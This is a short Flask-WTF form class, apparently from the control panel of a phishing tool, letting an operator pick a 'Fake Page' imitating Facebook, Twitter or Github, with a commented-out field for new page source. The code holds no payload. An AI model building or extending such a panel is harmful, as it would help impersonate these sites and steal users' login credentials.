from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField, SelectField, TextAreaField

class PanelForm(FlaskForm):
    page = SelectField('Fake Page', choices=[
        ('fb', 'Facebook'),
        ('tw', 'Twitter'),
        ('gh', 'Github')
    ])
    #newpagecode = TextAreaField('New page source code')
    submit = SubmitField('Save') 